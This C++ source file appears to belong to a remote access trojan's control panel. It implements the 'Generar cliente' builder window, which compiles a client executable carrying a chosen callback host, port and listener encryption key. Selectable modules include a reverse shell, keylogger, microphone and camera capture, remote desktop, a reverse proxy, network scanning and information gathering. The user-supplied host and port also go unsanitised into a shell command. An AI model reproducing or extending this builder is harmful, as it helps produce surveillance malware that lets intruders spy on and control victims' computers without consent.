#include "Server.hpp"
#include "frame_builder.hpp"
#include "frame_listener.hpp"
#include "misc.hpp"
#include <wx/utils.h> 

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(FrameBuilder, wxFrame)
	EVT_BUTTON(EnumBuilderIDS::BTN_Generar, FrameBuilder::OnGenerarCliente)
	EVT_BUTTON(EnumBuilderIDS::BTN_RefListeners, FrameBuilder::OnRefListeners)
	EVT_TEXT(EnumBuilderIDS::CMB_Listeners, FrameBuilder::OnCambioListener)
wxEND_EVENT_TABLE()

FrameBuilder::FrameBuilder(wxWindow* pParent)
: wxFrame(pParent, wxID_ANY, "Generar cliente", wxDefaultPosition, wxDefaultSize){

	wxPanel* pnl_Main = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* box_Server = new wxStaticBoxSizer(wxVERTICAL, pnl_Main, "Informacion de conexion");

	// Host y puerto de conexion
	wxBoxSizer* boxHost = new wxBoxSizer(wxHORIZONTAL);
	this->txtHost = new wxTextCtrl(pnl_Main, wxID_ANY, "127.0.0.1", wxDefaultPosition, wxDefaultSize);
	this->txtPort = new wxTextCtrl(pnl_Main, wxID_ANY, "65500", wxDefaultPosition, wxDefaultSize);

	boxHost->AddSpacer(10);
	boxHost->Add(new wxStaticText(pnl_Main, wxID_ANY, "Host:"));	
	boxHost->Add(this->txtHost, 1, wxALL | wxEXPAND);
	boxHost->AddSpacer(15);
	boxHost->Add(new wxStaticText(pnl_Main, wxID_ANY, "Puerto:"));
	boxHost->Add(this->txtPort, 0);
	boxHost->AddSpacer(10);

	//Listener
	wxArrayString listeners_opts;
	this->vc_listeners = p_Servidor->m_ListenerVectorCopy();
	for (size_t i = 0; i < this->vc_listeners.size(); i++) {
		listeners_opts.Add(this->vc_listeners[i].nombre);
	}

	wxBoxSizer* boxListener = new wxBoxSizer(wxHORIZONTAL);
	this->cmbListeners = new wxComboBox(pnl_Main, EnumBuilderIDS::CMB_Listeners, "Seleccione un listener", wxDefaultPosition, wxDefaultSize, listeners_opts, wxCB_READONLY);
	this->btnRefListeners = new wxButton(pnl_Main, EnumBuilderIDS::BTN_RefListeners, "Refrescar lista");

	boxListener->AddSpacer(10);
	boxListener->Add(new wxStaticText(pnl_Main, wxID_ANY, "Listener:"), 0);
	boxListener->Add(this->cmbListeners, 1, wxALL | wxEXPAND);
	boxListener->Add(this->btnRefListeners, 0);
	boxListener->AddSpacer(10);

	box_Server->AddSpacer(10);
	box_Server->Add(boxHost);
	box_Server->AddSpacer(10);
	box_Server->Add(boxListener, 1, wxALL | wxEXPAND);
	box_Server->AddSpacer(10);

	pnl_Main->SetSizer(box_Server);


	wxPanel* pnlMods = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* box_Mods = new wxStaticBoxSizer(wxVERTICAL, pnlMods, "Modulos");

	this->chkShell =        new wxCheckBox(pnlMods, wxID_ANY, "Shell Inversa", wxDefaultPosition, wxDefaultSize);
	this->chkShell->SetValue(true);

	this->chkKeylogger =    new wxCheckBox(pnlMods, wxID_ANY, "Keylogger", wxDefaultPosition, wxDefaultSize);
	this->chkMic =          new wxCheckBox(pnlMods, wxID_ANY, "Microfono", wxDefaultPosition, wxDefaultSize);
	this->chkCam =          new wxCheckBox(pnlMods, wxID_ANY, "Camara", wxDefaultPosition, wxDefaultSize);
	this->chkRemoteDesk =   new wxCheckBox(pnlMods, wxID_ANY, "Escritorio Remoto", wxDefaultPosition, wxDefaultSize);
	this->chkReverseProxy = new wxCheckBox(pnlMods, wxID_ANY, "Proxy Inversa", wxDefaultPosition, wxDefaultSize);
	this->chkNetScan =      new wxCheckBox(pnlMods, wxID_ANY, "Escaner de Red", wxDefaultPosition, wxDefaultSize);
	this->chkAdmArchivos =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Archivos", wxDefaultPosition, wxDefaultSize);
	this->chkAdmProcesos =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Procesos", wxDefaultPosition, wxDefaultSize);
	this->chkAdmVentanas =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Ventanas", wxDefaultPosition, wxDefaultSize);
	this->chkInformacion =  new wxCheckBox(pnlMods, wxID_ANY, "Recoleccion de informacion", wxDefaultPosition, wxDefaultSize);
	this->chkBromas =       new wxCheckBox(pnlMods, wxID_ANY, "Bromas :v", wxDefaultPosition, wxDefaultSize);

	box_Mods->AddSpacer(10);
	box_Mods->Add(this->chkShell);
	box_Mods->Add(this->chkKeylogger);
	box_Mods->Add(this->chkMic);
	box_Mods->Add(this->chkCam);
	box_Mods->Add(this->chkRemoteDesk);
	box_Mods->Add(this->chkReverseProxy);
	box_Mods->Add(this->chkNetScan);
	box_Mods->Add(this->chkAdmArchivos);
	box_Mods->Add(this->chkAdmProcesos);
	box_Mods->Add(this->chkAdmVentanas);
	box_Mods->Add(this->chkInformacion);
	box_Mods->Add(this->chkBromas);
	box_Mods->AddSpacer(10);

	pnlMods->SetSizer(box_Mods);

	this->btnGenerar = new wxButton(this, EnumBuilderIDS::BTN_Generar, "Generar cliente");


	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
	main_sizer->AddSpacer(10);
	main_sizer->Add(pnl_Main);
	main_sizer->AddSpacer(10);
	main_sizer->Add(pnlMods, 1, wxALL | wxEXPAND);
	main_sizer->AddSpacer(10);
	main_sizer->Add(this->btnGenerar, 0, wxALL | wxEXPAND);
	main_sizer->AddSpacer(10);

	this->SetSizerAndFit(main_sizer);

	this->SetSizeHints(this->GetSize(), this->GetSize());

	this->RefrescarLista();

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {

	if (this->strClave == "" || this->cmbListeners->GetValue() == "") {
		wxMessageBox("No se ha seleccionado un listener!!!", "Builder", wxICON_WARNING);
		return;
	}

	//Folder temporal para compilar binario
	wxString strNewfolder = ".\\build-" + RandomID(8);
	if (!::CreateDirectoryA(strNewfolder, NULL)) {
		wxMessageBox("[1] No se pudo crear el directorio " + strNewfolder, "Builder", wxICON_ERROR);
		return;
	}

	wxString strCmd = "cmake --fresh -B ";
	strCmd.append(strNewfolder);
	strCmd.append(1, ' ');
		
	//Mods a usar
	if (this->chkShell->GetValue()) {
		strCmd.append("-DUSE_SHELL=ON ");
	}
	if (this->chkKeylogger->GetValue()) {
		strCmd.append("-DUSE_KL=ON ");
	}
	if (this->chkMic->GetValue()) {
		strCmd.append("-DUSE_MIC=ON ");
	}
	if (this->chkCam->GetValue()) {
		strCmd.append("-DUSE_CAM=ON ");
	}
	if (this->chkRemoteDesk->GetValue()) {
		strCmd.append("-DUSE_RD=ON ");
	}
	if (this->chkReverseProxy->GetValue()) {
		strCmd.append("-DUSE_RP=ON ");
	}
	if (this->chkNetScan->GetValue()) {
		strCmd.append("-DUSE_SCAN=ON ");
	}
	if (this->chkAdmArchivos->GetValue()) {
		strCmd.append("-DUSE_FM=ON ");
	}
	if (this->chkAdmProcesos->GetValue()) {
		strCmd.append("-DUSE_PM=ON ");
	}
	if (this->chkAdmVentanas->GetValue()) {
		strCmd.append("-DUSE_WM=ON ");
	}
	if (this->chkInformacion->GetValue()) {
		strCmd.append("-DUSE_INFO=ON ");
	}
	if (this->chkBromas->GetValue()) {
		strCmd.append("-DUSE_FUN=ON ");
	}

	wxString strHost = this->txtHost->GetValue();
	wxString strPort = this->txtPort->GetValue();

	//Talvez una mejor verificacion de ip :v
	if (strHost.Length() == 0) {
		wxMessageBox("El host es invalido", "Builder", wxICON_ERROR);
		return;
	}

	//Agregar informacion de conexion
	strCmd.append("-DSRV_ADDR=");
	strCmd.append(strHost);
	strCmd.append(1, ' ');
	
	if (strPort.Length() == 0) {
		wxMessageBox("El port es invalido", "Builder", wxICON_ERROR);
		return;
	}

	strCmd.append("-DSRV_ADDR_PORT=");
	strCmd.append(strPort);

	//Llave de cifrado de listener
	strCmd.append(" -DSRV_ENC_KEY=\"");
	strCmd.append(this->strClave);
	strCmd.append("\" ");
	
	wxString strRutaSource = " ";

	wxDirDialog dialog(this, "Ruta del codigo");
	if (dialog.ShowModal() == wxID_OK) {
		strRutaSource.append(dialog.GetPath());
	}else {
		return;
	}

	strCmd.append(strRutaSource);
	strCmd.append(" && cmake --build ");
	strCmd.append(strNewfolder);
	strCmd.append(" --config Release && ");
	strCmd.append("xcopy " + strNewfolder + "\\Release\\cliente.exe .\\ && ");
	strCmd.append("del /S /Q " + strNewfolder + "\\* .* && ");
	strCmd.append("rmdir /S /Q .\\" + strNewfolder + "\\.");

	wxShell(strCmd);

	if (!::CreateDirectoryA(strNewfolder, NULL)) {
		wxMessageBox("[2] No se pudo crear el directorio " + strNewfolder, "Builder", wxICON_ERROR);
		return;
	}

	strCmd = "xcopy .\\cliente.exe .\\" + strNewfolder + "\\ && del /Q /F .\\cliente.exe";

	wxShell(strCmd);

	wxMessageBox("Cliente listo en " + strNewfolder, "Builder");
}

void FrameBuilder::OnRefListeners(wxCommandEvent& event) {
	this->RefrescarLista();
}

void FrameBuilder::OnCambioListener(wxCommandEvent& event) {
	wxString listener = this->cmbListeners->GetValue();
	if (this->vc_listeners.size() > 0 && listener != "") {
		for (size_t i = 0; i < this->vc_listeners.size(); i++) {
			if(this->vc_listeners[i].nombre == listener) {
				this->txtPort->ChangeValue(this->vc_listeners[i].puerto);
				this->strClave = this->vc_listeners[i].clave_acceso;
				break;
			}
		}
	}
}

void FrameBuilder::RefrescarLista() {
	//Obtener lista de listeners nuevamente y actualizar combobox

	wxArrayString listeners_opts;
	this->vc_listeners = p_Servidor->m_ListenerVectorCopy();
	if (this->vc_listeners.size() == 0) {
		//Spawn frame de listeners para crear uno
		frameListeners* frame_listener = new frameListeners(this);
		frame_listener->Show();
		return;
	}

	for (size_t i = 0; i < this->vc_listeners.size(); i++) {
		listeners_opts.Add(this->vc_listeners[i].nombre);
	}

	this->cmbListeners->Clear();
	this->cmbListeners->Append(listeners_opts);
	this->cmbListeners->Refresh();
}